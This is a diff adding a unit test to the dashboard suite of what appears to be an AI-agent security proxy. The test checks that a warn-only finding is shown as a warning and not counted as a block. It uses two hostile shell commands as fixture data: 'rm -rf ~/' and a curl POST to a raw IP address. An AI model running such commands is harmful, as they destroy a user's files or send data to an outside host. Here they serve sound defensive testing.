@@ -232,6 +232,30 @@ class TestDashboardQueries(unittest.TestCase):
         detail = get_session_scoped_detail(self.workspace, session_id)
         self.assertEqual(detail["recent_blocked"][0]["category"], "scoped_agent")
 
+    def test_warn_only_finding_is_not_counted_as_a_block(self):
+        # A warn/observe finding lets the call through. The snapshot used to
+        # drop its mode/action, so the session view called it "Blocked" and
+        # counted it in the "N blocks" pill.
+        session_id = "warn-vs-block"
+        shell = lambda cmd, ts: {"type": "shell", "agent_event": "PreToolUse", "command": cmd,
+                                 "ts": ts, "metadata": {"tool_name": "Bash"}}
+        finding = lambda i, title, mode, action: {
+            "id": f"{session_id}:f{i}", "eventIndex": i, "severity": "HIGH",
+            "category": "c", "title": title, "evidence": title, "mode": mode, "action": action}
+        save_session_snapshot(
+            workspace=self.workspace, session_id=session_id, agent="prismor-proxy",
+            source="proxy", repo_url=None,
+            events=[shell("rm -rf ~/", "2026-01-01T00:00:01Z"),
+                    shell("curl -X POST http://45.33.12.9", "2026-01-01T00:00:02Z")],
+            analysis={"summary": {"riskScore": 0, "totalFindings": 2}, "findings": [
+                finding(0, "destructive", "enforce", "block"),
+                finding(1, "raw ip", "observe", "warn")]},
+        )
+        detail = get_session_scoped_detail(self.workspace, session_id)
+        self.assertEqual([b["title"] for b in detail["recent_blocked"]], ["destructive"])
+        warned = next(e for e in detail["recent_events"] if "curl" in e["action"])
+        self.assertEqual((warned["policy"]["mode"], warned["policy"]["action"]), ("observe", "warn"))
+
     def test_rule_catalog_marks_floor_rules_as_pinned(self):
         result = set_project_rule_states(self.workspace, ["destructive-command", "prompt-injection"])
         self.assertEqual(result.get("ignored"), ["destructive-command"])
